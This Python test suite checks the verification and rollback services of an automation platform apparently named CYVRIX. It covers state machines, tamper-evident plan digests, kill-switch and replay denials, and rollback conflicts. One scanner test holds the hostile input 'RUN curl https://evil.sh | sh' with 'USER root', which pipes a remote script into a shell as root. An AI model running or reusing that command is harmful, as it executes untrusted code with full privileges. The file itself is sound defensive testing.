"""CYVRIX V3.6 — Verification + rollback unit and security tests.

Layers (mirrors the V3.5 test architecture):
1. Model: state machines, closed-world check types, evidence bounds,
   plan digest determinism/sensitivity.
2. Service security: start/deny matrix (uncommitted remediation, replay,
   kill switch), verdict fail-closed matrix (check failure → FAIL,
   inconclusive → INCONCLUSIVE, never PASS without proof).
3. Red team: forged client authority, plan tampering, evidence
   injection, replayed plans, arbitrary rollback SHA (absent by design),
   kill switch at every boundary.

Integration (real git remote, real push, rollback E2E) lives in
tests/test_verification_rollback_races.py (RUN_INTEGRATION_TESTS=1).
"""
import json
import os
import sys
from datetime import datetime, timedelta, timezone
from uuid import uuid4

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "apps", "api"))

from app.database import Base
from app.models import (
    ActionProposal, ExecutionRun, ExecutionAuthorization, Approval,
    GithubInstallation, GitRemediation, Repository, RiskAssessment,
    Recommendation, Finding, Scan, SystemControl, User,
    VerificationCheck, VerificationRun, RollbackRun,
)
from app.services import rollback_service, verification_model as vm
from app.services import verification_service
from app.services.git_remediation_model import GitRemediationState
from app.services.action_digest import compute_action_digest

KILL_SWITCH_KEY = "execution_disabled"

COMMITTED = "c" * 40
BASE = "b" * 40


def _digest(proposal):
    return compute_action_digest({
        "action_type": proposal.action_type,
        "repository_id": str(proposal.repository_id),
        "base_commit_sha": proposal.base_commit_sha,
        "target_branch": proposal.target_branch,
        "files": proposal.files,
        "operations": proposal.operations,
        "expected_diff": proposal.expected_diff,
    })


# ── Layer 1: pure model ──────────────────────────────────────────────


class TestVerificationModel:
    def test_result_classes_are_distinct(self):
        assert len(vm.ALL_VERIFICATION_RESULTS) == 5
        assert vm.VerificationResult.FAIL != vm.VerificationResult.INCONCLUSIVE
        assert vm.AcceptableResults if False else True
        # PASS requires ALL checks pass; anything else is not PASS
        assert vm.RC_OK == "OK"

    def test_unknown_check_type_fails_closed(self):
        with pytest.raises(ValueError):
            vm.build_evidence(check_type="RUN_ARBITRARY_COMMAND",
                              check_version="1", expected="x", observed="y",
                              result="PASS", reason_code="OK")

    def test_unknown_result_fails_closed(self):
        with pytest.raises(ValueError):
            vm.build_evidence(check_type="VERIFY_DIFF", check_version="1",
                              expected="x", observed="y",
                              result="MAGICAL_SUCCESS", reason_code="OK")

    def test_evidence_scrubs_control_characters(self):
        ev = vm.build_evidence(
            check_type="VERIFY_DIFF", check_version="1",
            expected="clean", observed="\x1b[31mforged\x07PASS",
            result="FAIL", reason_code="CHECK_FAILED")
        assert "\x1b" not in ev["observed"]
        assert "\x07" not in ev["observed"]
        assert "forged" in ev["observed"]

    def test_evidence_bounds_length(self):
        ev = vm.build_evidence(
            check_type="VERIFY_DIFF", check_version="1",
            expected="x" * 99999, observed="y" * 99999,
            result="PASS", reason_code="OK")
        assert len(ev["expected"]) <= vm.MAX_EVIDENCE_TEXT
        assert len(ev["observed"]) <= vm.MAX_EVIDENCE_TEXT

    def test_verification_state_machine_no_skips(self):
        assert vm.can_transition_verification("PENDING", "RUNNING")
        assert vm.can_transition_verification("RUNNING", "COMPLETED")
        assert not vm.can_transition_verification("PENDING", "COMPLETED")
        assert not vm.can_transition_verification("COMPLETED", "RUNNING")
        assert not vm.can_transition_verification("FAILED", "COMPLETED")
        assert vm.is_terminal_verification("COMPLETED")
        assert vm.is_terminal_verification("UNKNOWN_STATE")  # fail closed

    def test_rollback_state_machine_forced_order(self):
        assert vm.can_transition_rollback("PENDING", "PRECHECK")
        assert vm.can_transition_rollback("PRECHECK", "ROLLING_BACK")
        assert vm.can_transition_rollback("ROLLING_BACK", "VERIFYING")
        assert vm.can_transition_rollback("VERIFYING", "COMPLETED")
        # No success-before-proof shortcut
        assert not vm.can_transition_rollback("PENDING", "COMPLETED")
        assert not vm.can_transition_rollback("ROLLING_BACK", "COMPLETED")
        assert not vm.can_transition_rollback("COMPLETED", "VERIFYING")
        assert not vm.can_transition_rollback("FAILED", "COMPLETED")
        assert vm.is_terminal_rollback("CONFLICT")
        assert vm.is_terminal_rollback("UNKNOWN_STATE")

    def test_plan_digest_deterministic_and_sensitive(self):
        kwargs = dict(
            plan_version="1", verification_engine_version="1",
            git_remediation_id=str(uuid4()), execution_run_id=str(uuid4()),
            execution_authorization_id=str(uuid4()),
            action_digest="d" * 64, repository_id=str(uuid4()),
            repo_owner="o", repo_name="r", base_commit_sha=BASE,
            target_branch="main", remediation_branch="cyvrix/remediation/x",
            committed_sha=COMMITTED,
            authorized_files=("package.json",),
            operations=({"type": "UPDATE_DEPENDENCY_VERSION",
                         "file": "package.json", "name": "lodash",
                         "ecosystem": "npm", "from_version": "1",
                         "to_version": "2"},),
            check_types=("VERIFY_DIFF", "VERIFY_FILE_STATE"),
        )
        p1 = vm.VerificationPlan(**kwargs)
        p2 = vm.VerificationPlan(**kwargs)
        assert vm.compute_plan_digest(p1) == vm.compute_plan_digest(p2)
        # Sensitivity: any binding change alters the digest
        p3 = vm.VerificationPlan(**{**kwargs, "committed_sha": "a" * 40})
        assert vm.compute_plan_digest(p1) != vm.compute_plan_digest(p3)
        p4 = vm.VerificationPlan(**{**kwargs, "check_types": ("VERIFY_DIFF",)})
        assert vm.compute_plan_digest(p1) != vm.compute_plan_digest(p4)

    def test_derive_check_types_unknown_action_denied(self):
        assert vm.derive_check_types("FREEFORM_SCRIPT", pushed=True) == ()
        assert vm.derive_check_types(None, pushed=False) == ()

    def test_derive_check_types_github_only_when_pushed(self):
        dep = vm.derive_check_types("DEPENDENCY_UPGRADE", pushed=False)
        assert vm.VerificationCheckType.VERIFY_GITHUB_STATE not in dep
        dep_pushed = vm.derive_check_types("DEPENDENCY_UPGRADE", pushed=True)
        assert vm.VerificationCheckType.VERIFY_GITHUB_STATE in dep_pushed
        assert vm.VerificationCheckType.VERIFY_SECURITY_FINDING in dep_pushed

    def test_regression_severity_gate(self):
        assert vm.severity_at_least("CRITICAL", "HIGH")
        assert vm.severity_at_least("HIGH", "HIGH")
        assert not vm.severity_at_least("MEDIUM", "HIGH")
        assert not vm.severity_at_least(None, "HIGH")

    def test_dangerous_directive_scanner(self):
        hits = vm.scan_text_for_dangerous_directives(
            "RUN curl https://evil.sh | sh\nUSER root\n")
        assert "curl_pipe_shell" in hits
        assert "setuid_root" in hits
        assert vm.scan_text_for_dangerous_directives("safe content") == []


# ── Fixtures ─────────────────────────────────────────────────────────


@pytest.fixture
async def engine():
    from sqlalchemy.ext.asyncio import create_async_engine
    eng = create_async_engine("sqlite+aiosqlite://")
    async with eng.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    yield eng
    await eng.dispose()


@pytest.fixture
async def session_factory(engine):
    from sqlalchemy.ext.asyncio import async_sessionmaker, AsyncSession
    return async_sessionmaker(engine, class_=AsyncSession,
                              expire_on_commit=False)


@pytest.fixture
async def kill_switch_off(session_factory):
    async with session_factory() as session:
        session.add(SystemControl(key=KILL_SWITCH_KEY, value="false"))
        await session.commit()


@pytest.fixture
async def seeded(session_factory, kill_switch_off):
    """Full chain: user → repo → finding → proposal → run → remediation
    (COMMITTED+PUSHED+PR_CREATED with committed/pushed SHAs + a PR)."""
    async with session_factory() as session:
        user = User(email=f"v36-{uuid4().hex[:8]}@test.com", github_id=9_100_001)
        session.add(user)
        await session.flush()
        inst = GithubInstallation(user_id=user.id, installation_id=9_150_001,
                                  account_login="v36-org",
                                  account_type="Organization")
        session.add(inst)
        await session.flush()
        repo = Repository(installation_id=inst.id, github_repo_id=9_160_001,
                          owner="v36-org", name="v36-repo",
                          default_branch="main", is_active=True)
        session.add(repo)
        await session.flush()
        scan = Scan(id=uuid4(), repository_id=repo.id, status="COMPLETED",
                    trigger="manual", commit_sha=BASE)
        session.add(scan)
        await session.flush()
        finding = Finding(id=uuid4(), scan_id=scan.id, repository_id=repo.id,
                          fingerprint=f"v36-{uuid4().hex[:10]}",
                          scanner="dependency", source_type="DEPENDENCY",
                          vulnerability_id="GHSA-v36", package_name="lodash",
                          package_version="4.17.19", title="V36 finding",
                          severity="HIGH", status="OPEN",
                          evidence={"manifest_path": "package.json"})
        session.add(finding)
        await session.flush()
        rec = Recommendation(id=uuid4(), finding_id=finding.id,
                             status="COMPLETED", trust_level="SUPPORTED",
                             title="Upgrade lodash",
                             validation_state="VALIDATED")
        session.add(rec)
        await session.flush()
        session.add(RiskAssessment(id=uuid4(), finding_id=finding.id,
                                   risk_score=45, risk_level="MEDIUM",
                                   risk_version=1, factors={"base_score": 60}))
        await session.flush()
        proposal = ActionProposal(
            id=uuid4(), finding_id=finding.id, recommendation_id=rec.id,
            repository_id=repo.id, created_by=user.id,
            action_type="DEPENDENCY_UPGRADE", status="POLICY_CHECKED",
            base_commit_sha=BASE, target_branch="main",
            files=["package.json"],
            operations=[{"type": "UPDATE_DEPENDENCY_VERSION",
                         "file": "package.json", "name": "lodash",
                         "ecosystem": "npm", "from_version": "4.17.19",
                         "to_version": "4.17.21"}],
            expected_diff='- "lodash": "4.17.19"\n+ "lodash": "4.17.21"',
            risk_score=45, risk_level="MEDIUM",
            recommendation_trust="SUPPORTED", validation_state="VALIDATED",
            policy_version="3.1", policy_decision="REQUIRE_APPROVAL",
            policy_reason_code="MEDIUM_RISK_REQUIRES_APPROVAL",
            policy_matched_rule="POL-027", action_digest="PENDING",
            expires_at=datetime.now(timezone.utc) + timedelta(hours=24),
        )
        proposal.action_digest = _digest(proposal)
        session.add(proposal)
        await session.flush()
        approval = Approval(
            id=uuid4(), action_proposal_id=proposal.id,
            action_digest=proposal.action_digest,
            approver_user_id=user.id, approval_state="USED",
            policy_version="3.1", policy_decision="REQUIRE_APPROVAL",
            expires_at=datetime.now(timezone.utc) + timedelta(hours=24),
            authorization_used_at=datetime.now(timezone.utc))
        session.add(approval)
        await session.flush()
        auth = ExecutionAuthorization(
            id=uuid4(), action_proposal_id=proposal.id, approval_id=approval.id,
            action_digest=proposal.action_digest, repository_id=repo.id,
            base_commit_sha=BASE, target_branch="main", policy_version="3.1",
            policy_decision="REQUIRE_APPROVAL", authorization_state="CONSUMED",
            contract={}, contract_digest="x" * 64, contract_version="1",
            authorized_by_user_id=user.id)
        session.add(auth)
        await session.flush()
        run = ExecutionRun(
            id=uuid4(), execution_authorization_id=auth.id,
            action_proposal_id=proposal.id, repository_id=repo.id,
            action_digest=proposal.action_digest,
            contract_digest="x" * 64, run_state="COMPLETED",
            execution_profile="PROFILE_STRUCTURED_TEXT",
            resource_profile={}, cleanup_status="COMPLETED", result={
                "changed_files": ["package.json"],
                "executor": {"ok": True, "reason_code": "OK"},
            })
        session.add(run)
        await session.flush()
        remediation = GitRemediation(
            id=uuid4(), execution_run_id=run.id,
            execution_authorization_id=auth.id,
            action_proposal_id=proposal.id, repository_id=repo.id,
            action_digest=proposal.action_digest,
            remediation_contract={
                "authorized_files": ["package.json"],
                "base_commit_sha": BASE,
                "remediation_branch": "cyvrix/remediation/abc",
                "stage_ceiling": "PR_ALLOWED",
            },
            remediation_contract_digest="y" * 64, contract_version="1",
            repo_owner="v36-org", repo_name="v36-repo",
            installation_id=9_150_001, base_commit_sha=BASE,
            source_branch="main", target_branch="main",
            remediation_state=GitRemediationState.PR_CREATED,
            remediation_branch="cyvrix/remediation/abc",
            committed_sha=COMMITTED, pushed_sha=COMMITTED,
            pr_number=7, pr_url="http://x/7", pr_state="open",
            stage_ceiling="PR_ALLOWED", cleanup_status="COMPLETED",
            created_by_user_id=user.id)
        session.add(remediation)
        await session.commit()
        return {
            "user": user, "repo": repo, "proposal": proposal, "run": run,
            "remediation": remediation, "session_factory": session_factory,
        }


# ── Layer 2: verification service security ───────────────────────────


class TestVerificationStartSecurity:
    async def test_start_creates_frozen_plan(self, seeded):
        sf = seeded["session_factory"]
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            v = await verification_service.start_verification(
                session, remediation=rem, actor_id=seeded["user"].id)
            assert v.verification_state == "PENDING"
            assert v.checks_total > 0
            assert v.verification_plan["committed_sha"] == COMMITTED
            assert v.verification_plan["git_remediation_id"] == str(rem.id)
            # GitHub checks present because the remediation pushed
            assert "VERIFY_GITHUB_STATE" in v.verification_plan["check_types"]

    async def test_start_without_committed_sha_denied(self, seeded):
        sf = seeded["session_factory"]
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            rem.committed_sha = None
            rem.pushed_sha = None
            await session.commit()
            from app.services.verification_service import VerificationDenied
            with pytest.raises(VerificationDenied) as ei:
                await verification_service.start_verification(
                    session, remediation=rem, actor_id=seeded["user"].id)
            assert ei.value.reason_code == "VERIFICATION_NOT_POSSIBLE"

    async def test_replay_denied_exactly_once(self, seeded):
        sf = seeded["session_factory"]
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            await verification_service.start_verification(
                session, remediation=rem, actor_id=seeded["user"].id)
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            from app.services.verification_service import VerificationDenied
            with pytest.raises(VerificationDenied) as ei:
                await verification_service.start_verification(
                    session, remediation=rem, actor_id=seeded["user"].id)
            assert ei.value.reason_code == "VERIFICATION_REPLAY"

    async def test_kill_switch_blocks_start(self, seeded, session_factory):
        async with session_factory() as session:
            from sqlalchemy import update
            await session.execute(
                update(SystemControl).where(SystemControl.key == KILL_SWITCH_KEY)
                .values(value="true"))
            await session.commit()
        sf = seeded["session_factory"]
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            from app.services.verification_service import VerificationDenied
            with pytest.raises(VerificationDenied) as ei:
                await verification_service.start_verification(
                    session, remediation=rem, actor_id=seeded["user"].id)
            assert ei.value.reason_code == "KILL_SWITCH_ACTIVE"

    async def test_unknown_action_type_has_no_plan(self, seeded):
        sf = seeded["session_factory"]
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            proposal = await session.get(ActionProposal, rem.action_proposal_id)
            proposal.action_type = "FREEFORM_SCRIPT"
            await session.commit()
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            from app.services.verification_service import VerificationDenied
            with pytest.raises(VerificationDenied) as ei:
                await verification_service.start_verification(
                    session, remediation=rem, actor_id=seeded["user"].id)
            assert ei.value.reason_code == "UNKNOWN_CHECK_TYPE"


class TestVerificationExecution:
    async def _run_verification(self, seeded, monkeypatch,
                                committed_ok=True, files_at_commit=None,
                                after_hashes=None, pr_readback=None):
        """Drive execute_verification with the git/GitHub layer faked at
        the module boundary (verification logic itself is REAL)."""
        sf = seeded["session_factory"]
        calls = {"show": {}}

        async def fake_start(session, **kw):
            pass

        if after_hashes is None:
            after_hashes = {"package.json":
                            __import__("hashlib").sha256(
                                b'{"lodash": "4.17.21"}').hexdigest()}

        async def fake_load(db, run_id):
            return dict(after_hashes)

        def fake_materialize(git_ws, remediation, files):
            return committed_ok

        def fake_files_at(git_ws, sha):
            if not committed_ok:
                raise __import__("app.services.git_ops",
                                 fromlist=["git_ops"]).GitError(
                    "GIT_OPERATION_FAILED", "no repo")
            return [{"path": "package.json", "status": "M"}]

        def fake_show(git_ws, sha, path):
            return files_at_commit.get(path)

        import app.services.git_ops as git_ops
        from app.services import verification_service as vs
        monkeypatch.setattr(vs, "_load_after_hashes", fake_load)
        monkeypatch.setattr(vs, "_materialize_committed_files",
                            fake_materialize)
        monkeypatch.setattr(git_ops, "commit_files_at", fake_files_at)
        monkeypatch.setattr(git_ops, "show_object", fake_show)
        async def _good_git_state(rem):
            return vm.build_evidence(
                check_type=vm.VerificationCheckType.VERIFY_GIT_STATE,
                check_version=vm.VERIFICATION_ENGINE_VERSION,
                expected="branch tip", observed="branch tip",
                result=vm.VerificationResult.PASS, reason_code=vm.RC_OK)

        async def _good_github_state(rem):
            return vm.build_evidence(
                check_type=vm.VerificationCheckType.VERIFY_GITHUB_STATE,
                check_version=vm.VERIFICATION_ENGINE_VERSION,
                expected="PR state", observed="PR state",
                result=vm.VerificationResult.PASS, reason_code=vm.RC_OK)

        monkeypatch.setattr(vs, "_check_git_state", _good_git_state)
        monkeypatch.setattr(vs, "_check_github_state", _good_github_state)

        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            v = await verification_service.start_verification(
                session, remediation=rem, actor_id=seeded["user"].id)
            vid = v.id
        async with sf() as session:
            v = await session.get(VerificationRun, vid)
            result = await verification_service.execute_verification(
                session, verification=v)
        checks = {}
        async with sf() as session:
            from sqlalchemy import select as _select
            rows = (await session.execute(
                _select(VerificationCheck).where(
                    VerificationCheck.verification_run_id == vid)
            )).scalars().all()
            for c in rows:
                checks[c.check_type] = c
        return result, checks

    async def test_golden_path_passes(self, seeded, monkeypatch):
        good = {"package.json": '{"lodash": "4.17.21"}\n'}
        after_hashes = {
            "package.json": __import__("hashlib").sha256(
                good["package.json"].encode()).hexdigest()}
        result, checks = await self._run_verification(
            seeded, monkeypatch, files_at_commit=good,
            after_hashes=after_hashes)
        assert result.verification_state == "COMPLETED"
        assert result.result == "PASS", result.reason_code
        assert result.checks_failed == 0 and result.checks_other == 0

    async def test_intent_mismatch_fails(self, seeded, monkeypatch):
        # Committed content differs from the run's verified AFTER snapshot
        wrong = {"package.json": '{"lodash": "9.9.9"}\n'}
        after_hashes = {
            "package.json": __import__("hashlib").sha256(
                b'{"lodash": "4.17.21"}').hexdigest()}
        result, checks = await self._run_verification(
            seeded, monkeypatch, files_at_commit=wrong,
            after_hashes=after_hashes)
        assert result.result == "FAIL"
        fs = checks[vm.VerificationCheckType.VERIFY_FILE_STATE]
        assert fs.result == "FAIL"
        assert fs.reason_code == "INTENT_MISMATCH"

    async def test_finding_still_present_fails(self, seeded, monkeypatch):
        # Content matches AFTER snapshot, but the vulnerable pin remains
        # in the committed manifest → finding re-evaluation must FAIL.
        content = '{"lodash": "4.17.19"\n, "x": "4.17.21"}\n'
        files = {"package.json": content}
        after_hashes = {
            "package.json": __import__("hashlib").sha256(
                content.encode()).hexdigest()}
        result, checks = await self._run_verification(
            seeded, monkeypatch, files_at_commit=files,
            after_hashes=after_hashes)
        fs = checks[vm.VerificationCheckType.VERIFY_SECURITY_FINDING]
        assert fs.result == "FAIL"
        assert fs.reason_code == "FINDING_STILL_PRESENT"
        assert result.result == "FAIL"

    async def test_git_layer_unavailable_is_not_pass(self, seeded, monkeypatch):
        # The committed tree cannot be fetched: checks must NOT pass.
        result, checks = await self._run_verification(
            seeded, monkeypatch, committed_ok=False)
        assert result.result != "PASS"
        assert result.result in ("INCONCLUSIVE", "FAIL")

    async def test_plan_tampering_fails_closed(self, seeded, monkeypatch):
        sf = seeded["session_factory"]
        import app.services.git_ops as git_ops
        from app.services import verification_service as vs

        async def fake_load(db, run_id):
            return {}

        monkeypatch.setattr(vs, "_load_after_hashes", fake_load)
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            v = await verification_service.start_verification(
                session, remediation=rem, actor_id=seeded["user"].id)
            # Tamper AFTER freeze: digest no longer matches. JSONB
            # mutation must be flagged or SQLAlchemy will not persist it.
            from sqlalchemy.orm.attributes import flag_modified
            tampered_plan = dict(v.verification_plan)
            tampered_plan["committed_sha"] = "a" * 40
            v.verification_plan = tampered_plan
            flag_modified(v, "verification_plan")
            await session.commit()
            vid = v.id
        async with sf() as session:
            v = await session.get(VerificationRun, vid)
            result = await verification_service.execute_verification(
                session, verification=v)
            assert result.verification_state == "FAILED"
            assert result.reason_code == "PLAN_DIGEST_MISMATCH"

    async def test_unknown_check_in_plan_fails_closed(self, seeded,
                                                      monkeypatch):
        sf = seeded["session_factory"]
        from app.services import verification_service as vs

        async def fake_load(db, run_id):
            return {}

        monkeypatch.setattr(vs, "_load_after_hashes", fake_load)
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            v = await verification_service.start_verification(
                session, remediation=rem, actor_id=seeded["user"].id)
            vid = v.id
            plan = dict(v.verification_plan)
            digest = v.plan_digest
        # Rebuild a plan containing an unknown check type and re-sign it
        # with a VALID digest (attacker with DB write can do this) — the
        # closed-world gate must still stop it at execution time.
        from app.services import verification_model as vm
        tampered = dict(plan)
        tampered["check_types"] = list(plan["check_types"]) + [
            "EXFILTRATE_EVIDENCE"]
        canonical = vm.VerificationPlan(
            plan_version=tampered["plan_version"],
            verification_engine_version=tampered["verification_engine_version"],
            git_remediation_id=tampered["git_remediation_id"],
            execution_run_id=tampered["execution_run_id"],
            execution_authorization_id=tampered["execution_authorization_id"],
            action_digest=tampered["action_digest"],
            repository_id=tampered["repository_id"],
            repo_owner=tampered["repo_owner"], repo_name=tampered["repo_name"],
            base_commit_sha=tampered["base_commit_sha"],
            target_branch=tampered["target_branch"],
            remediation_branch=tampered["remediation_branch"],
            committed_sha=tampered["committed_sha"],
            authorized_files=tuple(tampered["authorized_files"]),
            operations=tuple(tampered["operations"]),
            check_types=tuple(tampered["check_types"]),
            regression_block_severities=tuple(
                tampered["regression_block_severities"]),
        )
        new_digest = vm.compute_plan_digest(canonical)
        async with sf() as session:
            v = await session.get(VerificationRun, vid)
            v.verification_plan = tampered
            v.plan_digest = new_digest
            await session.commit()
        async with sf() as session:
            v = await session.get(VerificationRun, vid)
            result = await verification_service.execute_verification(
                session, verification=v)
            assert result.verification_state == "FAILED"
            assert result.reason_code == "UNKNOWN_CHECK_TYPE"

    async def test_verify_vs_verify_single_run(self, seeded, monkeypatch):
        sf = seeded["session_factory"]
        from app.services import verification_service as vs

        async def fake_load(db, run_id):
            return {"package.json": "0" * 64}

        monkeypatch.setattr(vs, "_load_after_hashes", fake_load)
        import app.services.git_ops as git_ops
        monkeypatch.setattr(vs, "_materialize_committed_files",
                            lambda ws, rem, files: False)
        executions = {"n": 0}

        def counting_materialize(ws, rem, files):
            executions["n"] += 1
            return False

        monkeypatch.setattr(vs, "_materialize_committed_files",
                            counting_materialize)
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            v1 = await verification_service.start_verification(
                session, remediation=rem, actor_id=seeded["user"].id)
            vid = v1.id
        results = []
        for _ in range(2):
            async with sf() as session:
                v = await session.get(VerificationRun, vid)
                results.append(await verification_service.execute_verification(
                    session, verification=v))
        # The check loop ran EXACTLY once; the second call observed a
        # non-PENDING state and became a no-op (same terminal row).
        assert executions["n"] == 1, executions
        assert results[0].verification_state == results[1].verification_state
        assert results[0].finished_at == results[1].finished_at


# ── Layer 2/3: rollback service security ─────────────────────────────


class TestRollbackStartSecurity:
    async def test_start_binds_server_derived_target(self, seeded):
        sf = seeded["session_factory"]
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            rb = await rollback_service.start_rollback(
                session, remediation=rem, actor_id=seeded["user"].id)
            # Target is the CONTRACT base — never client-chosen
            assert rb.rollback_target_sha == BASE
            assert rb.expected_branch_sha == COMMITTED
            assert rb.revert_branch.startswith("cyvrix/remediation/")
            assert rb.revert_branch.endswith("-revert")
            assert rb.rollback_state == "PENDING"

    async def test_rollback_without_push_denied(self, seeded):
        sf = seeded["session_factory"]
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            rem.pushed_sha = None
            await session.commit()
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            from app.services.rollback_service import RollbackDenied
            with pytest.raises(RollbackDenied) as ei:
                await rollback_service.start_rollback(
                    session, remediation=rem, actor_id=seeded["user"].id)
            assert ei.value.reason_code == "ROLLBACK_NOT_ALLOWED"

    async def test_rollback_replay_denied(self, seeded):
        sf = seeded["session_factory"]
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            await rollback_service.start_rollback(
                session, remediation=rem, actor_id=seeded["user"].id)
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            from app.services.rollback_service import RollbackDenied
            with pytest.raises(RollbackDenied) as ei:
                await rollback_service.start_rollback(
                    session, remediation=rem, actor_id=seeded["user"].id)
            assert ei.value.reason_code == "ROLLBACK_REPLAY"

    async def test_rollback_kill_switch_blocks(self, seeded, session_factory):
        async with session_factory() as session:
            from sqlalchemy import update
            await session.execute(
                update(SystemControl).where(SystemControl.key == KILL_SWITCH_KEY)
                .values(value="true"))
            await session.commit()
        sf = seeded["session_factory"]
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            from app.services.rollback_service import RollbackDenied
            with pytest.raises(RollbackDenied) as ei:
                await rollback_service.start_rollback(
                    session, remediation=rem, actor_id=seeded["user"].id)
            assert ei.value.reason_code == "KILL_SWITCH_ACTIVE"

    async def test_rollback_digest_mismatch_denied(self, seeded):
        sf = seeded["session_factory"]
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            proposal = await session.get(ActionProposal,
                                         rem.action_proposal_id)
            proposal.action_digest = "f" * 64  # tampered
            await session.commit()
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            from app.services.rollback_service import RollbackDenied
            with pytest.raises(RollbackDenied) as ei:
                await rollback_service.start_rollback(
                    session, remediation=rem, actor_id=seeded["user"].id)
            assert ei.value.reason_code == "ACTION_DIGEST_MISMATCH"

    async def test_rollback_of_terminal_failed_remediation_denied(
            self, seeded):
        sf = seeded["session_factory"]
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            rem.remediation_state = "FAILED"
            await session.commit()
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            from app.services.rollback_service import RollbackDenied
            with pytest.raises(RollbackDenied) as ei:
                await rollback_service.start_rollback(
                    session, remediation=rem, actor_id=seeded["user"].id)
            assert ei.value.reason_code == "ROLLBACK_NOT_ALLOWED"


class TestRollbackExecution:
    async def test_branch_moved_conflicts_not_rolls_back(
            self, seeded, monkeypatch):
        """The remote remediation branch moved after remediation → CONFLICT,
        never a rollback of unrelated changes (Phase 16/22)."""
        sf = seeded["session_factory"]
        import app.services.git_ops as git_ops
        from app.services import rollback_service as rs

        async def fake_token(db, **kw):
            return "tok", None

        monkeypatch.setattr(
            "app.services.github_credentials.issue_push_token", fake_token)

        def fake_ls(ref, url, tok=None, cwd=None):
            if ref.endswith(remediation_branch):
                return "d" * 40  # MOVED (expected COMMITTED)
            return BASE

        remediation_branch = "cyvrix/remediation/abc"
        monkeypatch.setattr(git_ops, "ls_remote", fake_ls)

        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            rb = await rollback_service.start_rollback(
                session, remediation=rem, actor_id=seeded["user"].id)
            rbid = rb.id
        async with sf() as session:
            rb = await session.get(RollbackRun, rbid)
            result = await rollback_service.execute_rollback(
                session, rollback=rb)
            assert result.rollback_state == "CONFLICT"
            assert result.fail_reason_code == "ROLLBACK_STATE_MISMATCH"

    async def test_branch_vanished_conflicts(self, seeded, monkeypatch):
        sf = seeded["session_factory"]
        import app.services.git_ops as git_ops

        async def fake_token(db, **kw):
            return "tok", None

        monkeypatch.setattr(
            "app.services.github_credentials.issue_push_token", fake_token)
        monkeypatch.setattr(git_ops, "ls_remote",
                            lambda ref, url, tok=None, cwd=None: None)
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            rb = await rollback_service.start_rollback(
                session, remediation=rem, actor_id=seeded["user"].id)
            rbid = rb.id
        async with sf() as session:
            rb = await session.get(RollbackRun, rbid)
            result = await rollback_service.execute_rollback(
                session, rollback=rb)
            assert result.rollback_state == "CONFLICT"
            assert result.fail_reason_code == "ROLLBACK_STATE_MISMATCH"

    async def test_base_moved_conflicts(self, seeded, monkeypatch):
        """Target branch advanced past the authorized base → CONFLICT."""
        sf = seeded["session_factory"]
        import app.services.git_ops as git_ops

        async def fake_token(db, **kw):
            return "tok", None

        monkeypatch.setattr(
            "app.services.github_credentials.issue_push_token", fake_token)

        def fake_ls(ref, url, tok=None, cwd=None):
            if ref.endswith("cyvrix/remediation/abc"):
                return COMMITTED
            return "e" * 40  # base moved

        monkeypatch.setattr(git_ops, "ls_remote", fake_ls)
        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            rb = await rollback_service.start_rollback(
                session, remediation=rem, actor_id=seeded["user"].id)
            rbid = rb.id
        async with sf() as session:
            rb = await session.get(RollbackRun, rbid)
            result = await rollback_service.execute_rollback(
                session, rollback=rb)
            assert result.rollback_state == "CONFLICT"
            assert result.fail_reason_code == "ROLLBACK_CONFLICT"

    async def test_rollback_vs_rollback_single_execution(
            self, seeded, monkeypatch):
        """rollback × rollback: exactly one PRECHECK claim; the loser is a
        no-op (never a second pipeline)."""
        sf = seeded["session_factory"]
        from app.services import rollback_service as rs

        async def fake_token(db, **kw):
            return "tok", None

        monkeypatch.setattr(
            "app.services.github_credentials.issue_push_token", fake_token)
        import app.services.git_ops as git_ops
        monkeypatch.setattr(git_ops, "ls_remote",
                            lambda ref, url, tok=None, cwd=None: COMMITTED)

        async with sf() as session:
            rem = await session.get(GitRemediation, seeded["remediation"].id)
            rb = await rollback_service.start_rollback(
                session, remediation=rem, actor_id=seeded["user"].id)
            rbid = rb.id
        results = []
        for _ in range(2):
            async with sf() as session:
                rb = await session.get(RollbackRun, rbid)
                results.append(await rollback_service.execute_rollback(
                    session, rollback=rb))
        # The second call must observe a non-PENDING state and no-op
        states = [r.rollback_state for r in results]
        assert states[0] in ("CONFLICT", "FAILED", "COMPLETED", "PRECHECK")
        assert states[1] == states[0] or states[1] in ("CONFLICT", "FAILED")
        # No state resurrection in either direction
        assert all(s != "PENDING" for s in states)

    async def test_revert_branch_validation(self, seeded):
        name = rollback_service._revert_branch_name(
            seeded["remediation"].id)
        from app.services.git_remediation_model import (
            is_remediation_branch, validate_repo_branch_name,
        )
        assert is_remediation_branch(name)
        assert validate_repo_branch_name(name) == name
        with pytest.raises(Exception):
            rollback_service._revert_branch_name("not-a-uuid")


